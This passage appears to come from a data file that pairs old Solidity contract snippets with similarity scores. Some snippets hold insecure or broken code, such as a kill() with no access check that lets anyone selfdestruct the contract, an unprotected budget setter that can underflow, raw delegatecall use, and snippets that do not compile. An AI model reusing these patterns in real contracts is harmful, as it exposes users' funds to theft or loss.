  modifier isOwner {

    require( msg.sender == owner );

    _;

  }

  constructor() public { owner = msg.sender; }

  function chown( address newowner ) isOwner public { owner = newowner; }

}"
"contract SimpleBidding {

    address receivingAccount;
    uint deadline;

    struct Asset {
        string name;
        uint price;
        uint barcode;
        uint stockCount;
    }

    struct Vendor {
        string name;
        address account;
        Asset asset;
    }

    Vendor[] vendors;
    uint numberOfRequests = 0;
    event AssetRequested(uint barcode);
    event AssetSold(uint vendorID);
    event RequestProcessed();

    
    function SimpleBidding(address _vendor0, address _vendor1, address _vendor2) {
        
        Asset memory asset0 = Asset(""Asset"", 11, 1234, 1);
        vendors.push(Vendor(""Vendor0"", _vendor0, asset0));

        Asset memory asset1 = Asset(""Asset"", 12, 1234, 3);
        vendors.push(Vendor(""Vendor1"", _vendor1, asset1));

        Asset memory asset2 = Asset(""Asset"", 10, 1234, 1);
        vendors.push(Vendor(""Vendor2"", _vendor2, asset2));

        
        deadline = now + 10 * 1 minutes;
    }  

    function getVendor(uint id) constant returns (string name, address acc, string assetName, uint assetPrice, uint barcode, uint numAssets) {
        var vendor = vendors[id];
        name = vendor.name;
        acc = vendor.account;
        assetName = vendor.asset.name;
        assetPrice = vendor.asset.price;
        barcode = vendor.asset.barcode;
        numAssets = vendor.asset.stockCount;
    }

    function requestAsset(uint barcode) {
        numberOfRequests++;  
        AssetRequested(barcode);
    }

    modifier afterAssetRequested() { if (numberOfRequests == 0) throw; _;}

    function processRequest() afterAssetRequested {
        
        uint minIndex = 0;
        for (uint i=1; i<vendors.length; i++) {
            if (vendors[i].asset.price < vendors[minIndex].asset.price) {
                if (vendors[i].asset.stockCount > 0) {
                    minIndex = i;
                }
            }
        }

        if (vendors[minIndex].asset.stockCount > 0) {
            
            vendors[minIndex].asset.stockCount--;
            AssetSold(minIndex);
        }

        
        numberOfRequests = 0;

        RequestProcessed();
    }

    modifier afterDeadline() { if (now >= deadline) _; }

    
    function dispose() afterDeadline {
        suicide(receivingAccount);
    }
}",0.5228865876672859,"contract CZRSnowLocker is owned {
    
    address public tokenAddr;
    bool public isPaused = false;

    event Lock(address indexed addr, uint index, uint amount);
    event Unlock(address indexed addr, uint index, uint lockAmount, uint rewardAmount);
    
    struct LockRecord {
        uint time;
        uint amount;
        bool completed;
    }
    
    mapping(address => LockRecord[]) public lockRecordMap;
    
    function CZRSnowLocker(address _tokenAddr) public {
        tokenAddr = _tokenAddr;
    }
    
    function start() onlyOwner public {
        isPaused = false;
    }
    
    function pause() onlyOwner public {
        isPaused = true;
    }

    
    function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) public {
        require(_token == tokenAddr);
        require(_extraData.length == 0);
        _lock(_from, _value);
    }

    function _lock(address addr, uint amount) internal {
        require(!isPaused);
        require(amount >= 100 ether);

        token t = token(tokenAddr);
        t.transferFrom(addr, owner, amount);

        lockRecordMap[addr].push(LockRecord(now, amount, false));
        
        uint index = lockRecordMap[addr].length - 1;
        Lock(addr, index, amount);
    }
    
    
    
    
    function unlock(address addr, uint index) public {
        require(addr == msg.sender);
        
        var lock = lockRecordMap[addr][index];
        require(lock.amount > 0 && !lock.completed);

        var during = now - lock.time;
        var reward = _calcReward(during, lock.amount);

        token t = token(tokenAddr);
        t.transferFrom(owner, addr, lock.amount + reward);

        lock.completed = true;

        Unlock(addr, index, lock.amount, reward);        
    }

    function _calcReward(uint during, uint amount) internal view returns (uint) {
        uint n = during / 90 days;
        if (n == 0)
             return 0;
        if (n == 1)
            return amount * 2 / 100;
        if (n == 2)
            return amount * 5 / 100;
        if (n == 3)
            return amount * 8 / 100;
        return amount * 12 / 100;
    }
}"
"contract Govtcontract {

    uint256 public allocbudget;
    uint256 public rembudget;

    struct transaction{
        uint  expend;
        uint dept;
        string item;
        uint date;
        string location;
    }

 transaction public trx;


constructor (uint256 initbudget) public {
    allocbudget = initbudget;
    rembudget = initbudget;
}

function settx(uint amt, uint dep, string thing, uint date, string loc) public {
    trx.expend=amt;
    trx.dept=dep;
    trx.item=thing;
    trx.date=date;
    trx.location=loc;
    rembudget = rembudget - trx.expend;
}



function get() public constant returns (uint) {
    return rembudget;

    }
}",0.5940895031261179,"contract Token {
	function SetupToken(string tokenName, string tokenSymbol, uint256 tokenSupply) public;
    function balanceOf(address _owner) public constant returns (uint256 balance);
    function transfer(address _to, uint256 _amount) public returns (bool success);
    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success);
    function approve(address _spender, uint256 _amount) public returns (bool success);
    function allowance(address _owner, address _spender) public constant returns (uint256 remaining);
}"
"contract B {
    address owner; 
    address A; 

    function callCanOnlyBeCalledByB() {
        if(msg.sender != owner) throw;
        bytes4 functionSig = bytes4(sha3(""canOnlyBeCalledByB()""));    
        A.call(functionSig);
    }
}",0.5693038478955605,"contract Mew {

    address owner = msg.sender;

    function change(address a) public { if(owner==msg.sender) owner=a; }

    function close() public { if(owner==msg.sender) selfdestruct(msg.sender); }

}"
"contract Test {  
    struct Product {  
        uint p_id,  
        uint qty
    }

    mapping(bytes32 => Product) ProdMap;

    function registerProduct (bytes32 id, uint p, uint q) returns (bool) {
        ProdMap[id].p_id = p;
        ProdMap[id].qty = q;
    }
}",0.5551476413798355,"contract VatLike {
    function ilks(bytes32) public view returns (uint, uint, uint, uint, uint);
    function hope(address) public;
    function frob(bytes32, address, address, address, int, int) public;
}"
"contract Student{

    struct stu{
        address name;
        uint age;
        bool tookTest;
        address[] books;
    }

    stu public s;

    mapping(uint => stu) public StudentNames;

    function addStudent (uint ID, address _name, uint _age,address[] books) {
        StudentNames[ID] = stu(_name, _age, false, books);
    }
    function updateStudent (uint ID) {
        StudentNames[ID].tookTest = true;
    }

    function getBooks(uint ID) returns(address[]){
        return StudentNames[ID].books;
    }

}",0.5967130116287289,"contract ComplianceService {



    

    function check(address _token, address _spender, address _from, address _to, uint256 _amount) public returns (uint8);



    

    function forceCheck(address _token, address _spender, address _from, address _to, uint256 _amount) public returns (uint8);



    

    function checkVested(address _token, address _spender, address _holder, uint256 _balance, uint256 _amount) public returns (bool);

}"
"contract Storage {

  struct EntityStruct {
    string str_address;
    uint entityData;
    
  }

  EntityStruct[] public entityStructs;

  function newEntity(string entityAddress, uint entityData) public returns(uint rowNumber) {
    EntityStruct memory newEntity;
    newEntity.str_address = entityAddress;
    newEntity.entityData    = entityData;
    return entityStructs.push(newEntity)-1;
  }

  function getEntityCount() public constant returns(uint entityCount) {
    return entityStructs.length;
  }

  function getEntityByRowNumber(uint rowNumber) public constant returns(string entity, uint data) {
    string a = entityStructs[rowNumber].str_address;
    uint b =  entityStructs[rowNumber].entityData;
    return (a,b);
  }
}",0.5772449354637904,"contract MintableTokenFactory {

    address[] public contracts;

    address public lastContractAddress;

    

    event newMintableTokenContract (

       address contractAddress

    );



    constructor()

        public

    {



    }



    function getContractCount()

        public

        constant

        returns(uint contractCount)

    {

        return contracts.length;

    }



    function newMintableToken(string symbol, string name, address _owner)

        public

        returns(address newContract)

    {

        MintableToken c = new MintableToken(symbol, name, _owner);

        contracts.push(c);

        lastContractAddress = address(c);

        emit newMintableTokenContract(c);

        return c;

    }



    function seeMintableToken(uint pos)

        public

        constant

        returns(address contractAddress)

    {

        return address(contracts[pos]);

    }

}"
"contract Template {

    bytes32  public custName;
    bytes32  public custLoc;
    address  public contractAddress;

    function Template () {

        custName            = ""0xDEFAULT"";
        custLoc             = ""0xDEFAULT"";
        contractAddress     = address(this);

    }

    function AssignCustomerAttributes (bytes32 _custName, bytes32 _custLoc)  
        returns (bool isSuccess) {

        custName    = _custName;
        custLoc     = _custLoc;

        contractAddress  = address(this);

        return true;

    }

}",0.5886971483037903,"contract EmcoTokenInterface is ERC20 {



    function setReferral(bytes32 _code) public;

    function setReferralCode(bytes32 _code) public view returns (bytes32);



    function referralCodeOwners(bytes32 _code) public view returns (address);

    function referrals(address _address) public view returns (address);

    function userReferralCodes(address _address) public view returns (bytes32);



}"
"contract Master {

    address  public     masterContractAddress;
    bytes32  public     masterName = """";
    Template    myCustTemp; 

    function Master () {

        masterContractAddress = address(this);

    }

    function updateOwnerName (bytes32 _masterName)  {

        masterName = _masterName;

    }

    function createCustomer (bytes32 _custName, bytes32 _custLoc)  returns (bool flag) {

        Template myCust = new Template();

        if (myCust.AssignCustomerAttributes(_custName, _custLoc)) {

            return true;

        } else return false;

    }


}",0.5778586047883655,"contract ComponentListInterface {

    event ComponentUpdated (bytes32 _name, string _version, address _componentAddress);

    function setComponent(bytes32 _name, address _componentAddress) public returns (bool);

    function getComponent(bytes32 _name, string _version) public view returns (address);

    function getLatestComponent(bytes32 _name) public view returns(address);

    function getLatestComponents(bytes32[] _names) public view returns(address[]);

}"
"contract C {
   B private b;    
   function C() {
       B b = new B();
   }
   function calculateTheMeaning() {
      b.doStuff();
   }
   function getTheAnswer() returns (int) {
      return b.getStuff();
   }
}",0.5951089566575726,"contract VoxInterface {

    function par() public view returns (uint);

    function way() public view returns (uint);

    function era() public view returns (uint);

}"
"contract CertificateStorage is CertificateStorageOwnable {

    address public certificateAddress;

    event AuthorizedCaller(address caller);
    event DeAuthorizedCaller(address caller);

    function authorizeCaller(address _caller) public onlyOwner returns(bool) {
        authorizedCaller[_caller] = 1;
        emit AuthorizedCaller(_caller);
        return true;
    }

    constructor() public {
        authorizedCaller[msg.sender] = 1;
        emit AuthorizedCaller(msg.sender);
    }

    modifier onlyAuthCaller(){
        certificateAddress = msg.sender;
        require(authorizedCaller[msg.sender] == 1);
        _;
    }
    struct certificate_total {
        string universityName;
        string typeOfDegree;
        string major;
        string name;
        uint256 dateOfBirth;
    }
    mapping(address => certificate_total) certificateTotalMapping;

    certificate_total certificateTotal;

    function setCertificateTotal(string memory _universityName, 
                        string memory _typeOfDegree, 
                        string memory _major, 
                        string memory _name, 
                        uint256 _dateOfBirth) public onlyAuthCaller returns(address) {

        uint tmpData = uint(keccak256(abi.encodePacked(msg.sender, now)));
        address certificateNo = address(tmpData);

        certificateTotal.universityName = _universityName;
        certificateTotal.typeOfDegree = _typeOfDegree;
        certificateTotal.major = _major;
        certificateTotal.name = _name;
        certificateTotal.dateOfBirth = _dateOfBirth;

        certificateTotalMapping[certificateNo]= certificateTotal;

        return certificateNo;
    }
}",0.5640539332622364,"contract HighwayCertificates {

    

    event NewCertificate(uint256 indexed certificate_number, string course_name, string student_name, string linkedin, string released_project, string mentor_name_linkedin, string graduation_date, string graduation_place);

    

    struct Certificate {

        

        string course_name;

        string student_name;

        string student_linkedin;

        string released_project;

        string mentor_name_linkedin;

        string graduation_date;

        string graduation_place;

    }

    

    address public owner;

    uint256 public count = 0;

    mapping(uint256 => Certificate) public certificates;

    

    modifier onlyOwner {

        require(msg.sender == owner, ""Only owner can use this function"");

        _;

    }

    

    constructor() public {

        owner = msg.sender;

    }

    

    function addCertificate(uint256 certificate_number, string course_name, string student_name, string student_linkedin, string released_project, string mentor_name_linkedin, string graduation_date, string graduation_place) public onlyOwner {

        count++;

        require(count == certificate_number, ""Wrong certificate number"");

        certificates[count] = Certificate(course_name, student_name, student_linkedin, released_project, mentor_name_linkedin, graduation_date, graduation_place);

        emit NewCertificate(certificate_number, course_name, student_name, student_linkedin, released_project, mentor_name_linkedin, graduation_date, graduation_place);

    }

}"
"contract testStruct {
    struct stru{
        string[] s;
    }

    stru myStru;

    

    function add(string s) {
        string[] memory strAr; 
        strAr[0] = s;
        myStru = stru(strAr);
    }

    function getFirst(uint i) constant returns (string s) {
        s = myStru.s[0];
    }
}",0.5949764784300344,"contract Coursetro {
    
   string fName;
   uint age;
   
   function setInstructor(string _fName, uint _age) public {
       fName = _fName;
       age = _age;
   }
   
   function getInstructor() public constant returns (string, uint) {
       return (fName, age);
   }
    
}"
"contract HealthCareDemo {

    
    string public constant name = ""HealthCare_v0.1"";
    string public constant symbol = ""HC"";
    uint8 public constant decimals = 18;  
    address owner;

    function kill() { 
    
            selfdestruct(owner);
    }
    struct SubscriberStruct {
        uint id;
        string name;
        string accountType;
        uint16 accBalance;

    }
    SubscriberStruct[] public subscribers;


    event eveSubscriber (
        uint id,
        string name,
        string accountType,
        uint16 accBalance
        );

    
    function addProvider(string name, string accountType) returns (bool) {
        uint16 _accBal = 0;
        if(compareStrings(accountType,""HRA"")) {
            _accBal = 500;
        }
        else if (compareStrings(accountType,""FSA"")) {
            _accBal = 1000;
        }
        else {
            _accBal = 100;
        }

        SubscriberStruct memory s;
        s.name = name;
        s.accountType = accountType;
        s.id = subscribers.length;
        s.accBalance = _accBal;
        subscribers.push(s);

        
        eveSubscriber(s.id,s.name,s.accountType,s.accBalance);

        return true;
    }
    
    function getProviderName(uint id) public returns (string _name) {
        return subscribers[id].name;
    }
    function getAccountBalance(uint id) public returns (uint16 _accBal) {
        return subscribers[id].accBalance;
    }

    function submitClaim(uint _id, uint16 _claimAmount) public returns (bool status, uint16 _remainingBalance) {
        if(subscribers[_id].accBalance >= _claimAmount) {
            subscribers[_id].accBalance -= _claimAmount;
            return (true, subscribers[_id].accBalance);
        }
        else {
            return (false, subscribers[_id].accBalance);
        }
    }

    function compareStrings (string a, string b) view private returns (bool){
       return keccak256(a) == keccak256(b);
   }

}",0.5913035210300085,"contract EIP20 is EIP20Interface {

    uint256 constant private MAX_UINT256 = 2**256 - 1;
    mapping (address => uint256) public balances;
    mapping (address => mapping (address => uint256)) public allowed;
    
    string public name;                   
    uint8 public decimals = 8;                
    string public symbol;                 

    function EIP20(
        uint256 _initialAmount,
        string _tokenName,
        string _tokenSymbol
    ) public {
        totalSupply = _initialAmount * 10 ** uint256(decimals); 
        balances[msg.sender] = totalSupply;               
        name = _tokenName;                                   
        symbol = _tokenSymbol;                               
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balances[msg.sender] >= _value);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        Transfer(msg.sender, _to, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        uint256 allowance = allowed[_from][msg.sender];
        require(balances[_from] >= _value && allowance >= _value);
        balances[_to] += _value;
        balances[_from] -= _value;
        if (allowance < MAX_UINT256) {
            allowed[_from][msg.sender] -= _value;
        }
        Transfer(_from, _to, _value);
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowed[msg.sender][_spender] = _value;
        Approval(msg.sender, _spender, _value);
        return true;
    }

    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }
}"
"contract CollegeAdmin {
    uint8 public studentAge=21;
    uint16 public studentIncome=15000;
    uint8 public studentScore=4;

    uint8 public studentAttendance=96;

    function testReturn() returns (uint) {
        studentAge=90;
        return 89;
    }
}",0.5574771674785701,"contract PoSTokenStandard {

    uint256 public stakeStartTime;

    function mint() public returns (bool);

    function coinAge() public constant returns (uint256);

    event Mint(address indexed _address, uint _reward);

}"
"contract company {

    struct contractDetails {
        string contractId;
        string companyA;
        string companyB;
        address A;
        address B;
        uint256 timestamp;
        string signHash;
        bool isSigned;
    }

    mapping (string => contractDetails) contracts;
    mapping (string => string) hashMap;

    event contractSigned (
        string contractId,
        string companyA,
        string companyB,
        address A,
        address B,
        uint256 timestamp,
        string signHash,
        bool isSigned
    );

    function createContract(string memory _contractId, string memory _companyA, string memory _companyB, address _B) public {
        contracts[_contractId] = contractDetails(_contractId, _companyA, _companyB, msg.sender, _B, now, '', false);
    }

    function signContract(string memory _contractId) public {
        contractDetails storage signDetails = contracts[_contractId];
        signDetails.isSigned = true;
        signDetails.timestamp = now;
        emit contractSigned(_contractId, signDetails.companyA, signDetails.companyB, signDetails.A, signDetails.B, signDetails.timestamp, signDetails.signHash, signDetails.isSigned);
    }

    function verifySign(string memory _contractId) public view returns(bool) {
        contractDetails storage verify = contracts[_contractId];
        return(verify.isSigned);
    }

    function getContract(address _address) view public returns() {
      
    }
}",0.5218568932438057,"contract Migratable {

  

  event Migrated(string contractName, string migrationId);



  

  mapping (string => mapping (string => bool)) internal migrated;



  

  string constant private INITIALIZED_ID = ""initialized"";





  

  modifier isInitializer(string contractName, string migrationId) {

    validateMigrationIsPending(contractName, INITIALIZED_ID);

    validateMigrationIsPending(contractName, migrationId);

    _;

    emit Migrated(contractName, migrationId);

    migrated[contractName][migrationId] = true;

    migrated[contractName][INITIALIZED_ID] = true;

  }



  

  modifier isMigration(string contractName, string requiredMigrationId, string newMigrationId) {

    require(isMigrated(contractName, requiredMigrationId), ""Prerequisite migration ID has not been run yet"");

    validateMigrationIsPending(contractName, newMigrationId);

    _;

    emit Migrated(contractName, newMigrationId);

    migrated[contractName][newMigrationId] = true;

  }



  

  function isMigrated(string contractName, string migrationId) public view returns(bool) {

    return migrated[contractName][migrationId];

  }



  

  function initialize() isInitializer(""Migratable"", ""1.2.1"") public {

  }



  

  function validateMigrationIsPending(string contractName, string migrationId) private view {

    require(!isMigrated(contractName, migrationId), ""Requested target migration ID has already been run"");

  }

}"
"contract HDataAccessManager {

    mapping (string => string) dataLink;
    mapping (string => string) dataHash;
    mapping (string => bytes32) private passwords; 
    string[] users;


    function _isValid(string _user_id, string _encryption_key_hash) returns (bool) {
        for(uint i = 0;i<users.length;i++){
            if(keccak256(users[i]) == keccak256(_user_id) && 
                keccak256(_encryption_key_hash) == passwords[_user_id]) {

                return true;
            }
        }
        return false;
    }

    function addUser(string _user_id, string _encryption_key_hash) {
        users.push(_user_id);
        passwords[_user_id] = keccak256(_encryption_key_hash);
    }

    function totalUsers() returns (uint) {
        return users.length;
    }


    
    function storeLink(string _user_id, string _link){

        
        

        dataLink[_user_id] = _link;
    }

    function storeHash(string _user_id, string _hash){

        
        

        dataHash[_user_id] = _hash;
    }


    function retrieveLink(string _user_id, string _encryption_key_hash) returns (string, string) {

        
        require(_isValid(_user_id, _encryption_key_hash));

        string link = dataLink[_user_id];
        string hash = dataHash[_user_id];
        return (link, hash);

}

}",0.5031533588926436,"contract FoundationToken {

    string internal _symbol;

    string internal _name;

    uint8 internal _decimals;

    uint internal _totalSupply = 1000;

    mapping (address => uint) internal _balanceOf;

    mapping (address => mapping (address => uint)) internal _allowances;

    

    constructor(string symbol, string name, uint8 decimals, uint totalSupply) public {

        _symbol = symbol;

        _name = name;

        _decimals = decimals;

        _totalSupply = totalSupply;

    }

    

    function name() public view returns (string) {

        return _name;

    }

    

    function symbol() public view returns (string) {

        return _symbol;

    }

    

    function decimals() public view returns (uint8) {

        return _decimals;

    }

    

    function totalSupply() public view returns (uint) {

        return _totalSupply;

    }

    

    function balanceOf(address _addr) public view returns (uint);



    

    

    

    

    function transfer(address _to, uint _value) public returns (bool);

    event Transfer(address indexed _from, address indexed _to, uint _value);

}"
"contract IterableMappingWithDelete {

  struct Voter {
    uint votesCast;                                         
    uint voterListPointer;                                  
  }

  mapping(address => Voter) public voterStructs;            
  address[] public voterList;                               

  function getVoterCount() public constant returns(uint voterCount) {return voterList.length;}

  function isVoter(address voterId) public constant returns(bool isIndeed) {
    if(voterList.length==0) return false;
    return voterList[voterStructs[voterId].voterListPointer]==voterId; 
  }

  function insertVoter(address voterId) public returns(bool success) {
    if(isVoter(voterId)) throw;
    voterStructs[voterId].voterListPointer = voterList.push(voterId) - 1;
    return true;
  }

  function deleteVoter(address voterId) public returns(bool success) {
    if(!isVoter(voterId)) throw;
    uint rowToDelete = voterStructs[voterId].voterListPointer;
    uint voterListLastRow = voterList.length-1;
    address keyToMove = voterList[voterListLastRow];
    voterStructs[keyToMove].voterListPointer = rowToDelete;
    voterList[rowToDelete] = keyToMove;

    
    

    delete voterStructs[voterId];

    voterList.length--;
    return true;
  }

}",0.5324435097763279,"contract TrustaBitToken is MintableToken {

  string public constant name = ""TrustaBits"";

  string public constant symbol = ""TAB"";

  uint256 public constant decimals = 18;

  modifier isFinishedMinting () {
    require(mintingFinished);
    _;
  }
  function transfer(address _to, uint256 _value) public isFinishedMinting returns (bool) {
    return super.transfer(_to, _value);
  }

  function transferFrom(address _from, address _to, uint256 _value) public isFinishedMinting returns (bool) {
    return super.transferFrom(_from, _to, _value);
  }

  function approve(address _spender, uint256 _value) public isFinishedMinting returns (bool) {
    return super.approve(_spender, _value);
  }

  function increaseApproval(address _spender, uint _addedValue) public isFinishedMinting returns (bool success) {
    return super.increaseApproval(_spender, _addedValue);
  }

  function decreaseApproval(address _spender, uint _subtractedValue) public isFinishedMinting returns (bool success) {
    return super.decreaseApproval(_spender, _subtractedValue);
  }

}"
"contract Consortium is Destructible {

    
    struct Member {
        string name;
        address member;
        Organization organization;
        uint since;
    }

    mapping (address => uint) public memberId;
    Member[] public members;

    
    event MembershipChanged(address member, bool isMember);

    
    modifier onlyMembers {
        require(memberId[msg.sender] != 0);
        _;
    }

    

    
    function Consortium() public {
        addMember(owner, ""Consortium Funder"");
    }

    
    function addMember(address _targetMember, string _memberName) onlyOwner public returns(bool) {
        uint id = memberId[_targetMember];
        if (id == 0) {
            memberId[_targetMember] = members.length;
            id = members.length++;
        }

        Organization org = new Organization(_memberName);
        org.transferOwnership(_targetMember);
        members[id] = Member({name: _memberName, member: _targetMember, organization: org, since: now});
        emit MembershipChanged(_targetMember, true);
        return true;
    }

    
    function updateMemberName(string _name) onlyMembers public returns (bool) {
        members[memberId[msg.sender]].name = _name;
        return true;
    }

    
    function updateMember(string _name, address _memberAddress) onlyMembers public returns (bool) {
        Member storage member = members[memberId[msg.sender]];
        member.name = _name;
        address orgAddress = address(member.organization);
        orgAddress.delegatecall(bytes4(keccak256(""transferOwnership(address)"")), _memberAddress);
        member.member = _memberAddress;
        emit MembershipChanged(_memberAddress, true);
        return true;
    }

    
    function removeMember() onlyMembers public {
        for (uint i = memberId[msg.sender]; i < members.length-1; i++){
            members[i] = members[i+1];
        }
        memberId[msg.sender] = 0;
        delete members[members.length-1];
        members.length--;
    }

    
    function removeMember(address _targetMember) onlyOwner public {
        require(memberId[_targetMember] != 0);

        for (uint i = memberId[_targetMember]; i < members.length-1; i++){
            members[i] = members[i+1];
        }
        memberId[_targetMember] = 0;
        delete members[members.length-1];
        members.length--;
    }

    
    function isMember(address _targetMember) public view returns (bool) {
        return memberId[_targetMember] != 0;
    } 

    
    function numMembers() public view returns (uint) {
        return members.length;
    }
}",0.5949569117165577,"contract BasicToken is ERC20Basic {
  using SafeMath for uint;
    
  address public owner;
  
  
  bool public transferable = true;
  
  mapping(address => uint) balances;

  
  mapping (address => bool) public frozenAccount;

  modifier onlyPayloadSize(uint size) {
     if(msg.data.length < size + 4) {
       throw;
     }
     _;
  }
  
  modifier unFrozenAccount{
      require(!frozenAccount[msg.sender]);
      _;
  }
  
  modifier onlyOwner {
        require(msg.sender == owner);
        _;
  }
  
  modifier onlyTransferable {
      if (transferable) {
          _;
      } else {
          emit LiquidityAlarm(""The liquidity is switched off"");
          throw;
      }
  }
  
  
  event FrozenFunds(address _target, bool _frozen);
  
  
  event InvalidCaller(address indexed _from);

  
  event Burn(address indexed _from, uint256 value);
  
  
  event OwnershipTransferred(address indexed _from, address indexed to);
  
  
  event InvalidAccount(address indexed _from, bytes msg);
  
  
  event LiquidityAlarm(bytes msg);
  
  function transfer(address _to, uint _value) onlyPayloadSize(2 * 32) unFrozenAccount onlyTransferable public returns (bool){
    if (frozenAccount[_to]) {
        emit InvalidAccount(_to, ""The receiver account is frozen"");
		return false;
    } else {
        balances[msg.sender] = balances[msg.sender].sub(_value);
        balances[_to] = balances[_to].add(_value);
        emit Transfer(msg.sender, _to, _value);
		return true;
    } 
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }

  
  
  
  function freezeAccount(address target, bool freeze) onlyOwner public {
      frozenAccount[target]=freeze;
      emit FrozenFunds(target, freeze);
    }
  
  function accountFrozenStatus(address target) public view returns (bool frozen) {
      return frozenAccount[target];
  }
  
  function transferOwnership(address newOwner) onlyOwner public {
      if (newOwner != address(0)) {
          address oldOwner=owner;
          owner = newOwner;
          emit OwnershipTransferred(oldOwner, owner);
        }
  }
  
  function switchLiquidity (bool _transferable) onlyOwner public returns (bool success) {
      transferable=_transferable;
      return true;
  }
  
  function liquidityStatus () public view returns (bool _transferable) {
      return transferable;
  }
}"
"contract Proposal {
        Ballot ballot;
        bool complete;
        uint approveCount;
        uint rejectCount;
        mapping (address => bool) voters;

        constructor() {
            ballot = new Ballot(msg.sender);
        }

        function vote(bool _vote) {
            require(ballot.checkIfContributor(msg.sender));
            require(!voters[msg.sender]);

            voters[msg.sender] = true;
            if (_vote) {
                approveCount++;  
            } else {
                rejectCount++;
            }

        }
}",0.5394184253938382,"contract Mintable is Ownable {
    mapping(address => bool) minters;

    modifier onlyMinter {
        require(minters[msg.sender] == true);
        _;
    }

    function Mintable() public {
        adjustMinter(msg.sender, true);
    }

    function adjustMinter(address minter, bool canMint) public onlyOwner {
        minters[minter] = canMint;
    }

    function mint(address _to, uint256 _value) public;

}"
"contract Caller {

 function doSomething(address _callee, string _text) public {
   _callee.delegatecall(
                     bytes4(keccak256(""validate(string)"")), _text));

 
 }
}",0.5636528678724855,"contract tDeployer {

	function deployToken(string _tName, string _tSymbol, uint _mint, address _owner) public returns (address);

}"
"contract EncryptedData {
   bytes data;
   string public decryptedData;

   constructor(bytes data_) public {
      data = data_;
   }

   function decrypt(bytes key) public {
      decryptedData = decryptDataSomehow(data, key);
   }
}",0.590569476187571,"contract HashMap {
    mapping(bytes32 => bytes) map;
    
    function set(bytes _data) public {
        map[keccak256(_data)] = _data;
    }
    
    function get(bytes32 _hash) public constant returns (bytes data) {
        return map[_hash];
    }
}"
"contract C {

    struct A {
        uint256 a;
        uint256 b;
    }

    struct B {
        A ax;
        uint256 c;
    }

    struct C {
        string name;
        B[] bs;
    }

    function init() {
        C memory c;
        B memory b;
        A memory a;

        a.a = 10;
        a.b = 20;

        b.ax = a;
        b.c = 30;

        c.name = ""Test test test"";
        c.bs[0] = b;
    }
}",0.5570123427884226,"contract test {

    

    function sub1(uint256 _a, uint256 _b) public pure returns (uint256 result) {

        require(_a >= _b);

        return _a - _b;

    }

    

    function sub2(uint256 _a, uint256 _b) public pure returns (uint256 result) {

        require(_a >= _b, ""_a cannot be less than _b"");

        return _a - _b;

    }

    

}"
"contract Test {

    function stringToUint(string s) constant returns (uint) {
    bytes memory b = bytes(s);
    uint result = 0;
    for (uint i = 0; i < b.length; i++) { 
        if (b[i] >= 48 && b[i] <= 57) {
            result = result * 10 + (uint(b[i]) - 48); 
        }
    }
    return result; 
    }

        
    function parseInt(string _a)  returns (uint) {
        return parseInt(_a, 0);
    }

    
    function parseInt(string _a, uint _b) internal returns (uint) {
        bytes memory bresult = bytes(_a);
        uint mint = 0;
        bool decimals = false;
        for (uint i=0; i<bresult.length; i++){
            if ((bresult[i] >= 48)&&(bresult[i] <= 57)){
                if (decimals){
                   if (_b == 0) break;
                    else _b--;
                }
                mint *= 10;
                mint += uint(bresult[i]) - 48;
            } else if (bresult[i] == 46) decimals = true;
        }
        if (_b > 0) mint *= 10**_b;
        return mint;
    }

}",0.5785598411557967,"contract StringHelpers {

    using strings for *;

    

    function stringToBytes32(string memory source) internal returns (bytes32 result) {

        bytes memory tempEmptyStringTest = bytes(source);

        if (tempEmptyStringTest.length == 0) {

            return 0x0;

        }

    

        assembly {

            result := mload(add(source, 32))

        }

    }



    function bytes32ToString(bytes32 x) constant internal returns (string) {

        bytes memory bytesString = new bytes(32);

        uint charCount = 0;

        for (uint j = 0; j < 32; j++) {

            byte char = byte(bytes32(uint(x) * 2 ** (8 * j)));

            if (char != 0) {

                bytesString[charCount] = char;

                charCount++;

            }

        }

        bytes memory bytesStringTrimmed = new bytes(charCount);

        for (j = 0; j < charCount; j++) {

            bytesStringTrimmed[j] = bytesString[j];

        }

        return string(bytesStringTrimmed);

    }

}"
"contract DappTokenSale {
        address admin;
        DappToken public tokenContract;
        uint256 public tokenPrice;
        uint256 public tokensSold;

        event Sell(address _buyer, uint256 _amount);

        function DappTokenSale(DappToken _tokenContract, uint256 _tokenPrice) public {
            admin = msg.sender;
            tokenContract = _tokenContract;
            tokenPrice = _tokenPrice;
        }

        function multiply(uint x, uint y) internal pure returns (uint z) {
            require(y == 0 || (z = x * y) / y == x);
        }

        function buyTokens(uint256 _numberOfTokens) public payable {
            require(msg.value == multiply(_numberOfTokens, tokenPrice));
            require(tokenContract.balanceOf(this) >= _numberOfTokens);
            require(tokenContract.transfer(msg.sender, _numberOfTokens));

            tokensSold += _numberOfTokens;

            Sell(msg.sender, _numberOfTokens);
        }

      
        function endSale() public {
                
                require (msg.sender == admin);

                 
                require(tokenContract.transfer(admin,tokenContract.balanceOf(this)));


                
                selfdestruct(admin);

        }
 }",0.5979948691173651,"contract TokenMaker is Ownable {

    uint public fee_in_dc_units = 10e18;

    address public dc_token_address;

    token dcToken;

    mapping (address => address[]) public myTokens;





    function setFee(uint number_of_dc_uints) public onlyOwner {

        fee_in_dc_units = number_of_dc_uints;

    }



    function setDcTokenAddress(address _addr) public onlyOwner {

      dc_token_address = _addr;

      dcToken = token(_addr);

    }



    function makeToken(string memory _name, string memory _symbol, uint _totalSupply, uint _decimals) public {

        require(dcToken.transferFrom(msg.sender, address(this), fee_in_dc_units));



        ERC20Token newToken = new ERC20Token(msg.sender, _name, _symbol, _totalSupply, _decimals);

        myTokens[msg.sender].push(address(newToken));



    }



    function getMyTokens() public view returns (address[] memory) {

      return myTokens[msg.sender];

    }



    function withdrawTokens() public onlyOwner {

      dcToken.transfer(msg.sender, dcToken.balanceOf(address(this)));

    }

}"
"contract Something {
    mapping (address => Ton[]) allTons;

    struct Ton { 
        uint id;
        string name;
        bool access;
    }

    function Something() public {
        allTons[msg.sender].push(Ton({
            id: 1,
            name: ""CoolDude"",
            access: true
        }));
